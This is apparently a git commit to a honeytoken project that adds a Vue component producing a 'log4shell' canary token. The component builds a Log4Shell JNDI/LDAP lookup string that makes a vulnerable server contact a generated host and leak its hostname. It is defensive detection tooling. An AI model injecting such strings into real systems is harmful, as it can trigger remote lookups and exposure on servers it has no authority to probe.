879a44c8cb9589221a73c5d57d7968e04f24e0b9
vittoriaThinkst <126554007+vittoriaThinkst@users.noreply.github.com>
2024-04-16 18:08:18 +0200

    Generate log4shell token (#388)
    * add log4shell token
    
    * update log4shell
    
    * change message for empty suggestions

---
+++ frontend_vue/src/components/tokens/log4shell/ManageToken.vue
@@ -0,0 +1,20 @@
+<template>
+  <div v-if="!tokenUsage">Error loading</div>
+  <TokenDisplay
+    v-else
+    :token-usage="tokenUsage"
+  />
+</template>
+
+<script lang="ts" setup>
+import { ref } from 'vue';
+import TokenDisplay from './TokenDisplay.vue';
+import type { ManageTokenBackendType } from '@/components/tokens/types.ts';
+
+const props = defineProps<{
+  tokenBackendResponse: ManageTokenBackendType;
+}>();
+
+const hostname = ref(props.tokenBackendResponse.canarydrop.generated_hostname);
+const tokenUsage = ref(`\${jndi:ldap://x\${hostName}.L4J.${hostname.value}/a}`);
+</script>
